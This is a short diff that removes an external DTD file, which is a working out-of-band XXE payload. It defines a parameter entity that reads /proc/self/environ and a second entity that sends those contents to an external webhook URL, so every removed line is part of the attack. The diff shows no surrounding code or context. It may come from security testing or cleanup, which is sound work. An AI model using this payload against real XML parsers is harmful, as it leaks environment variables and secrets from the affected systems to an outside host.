@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///proc/self/environ">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook-tester.ap-southeast-2.dev.atl-paas.net/p99fwr8/exfil?x=%file;'>">
-%eval;
-%exfil;
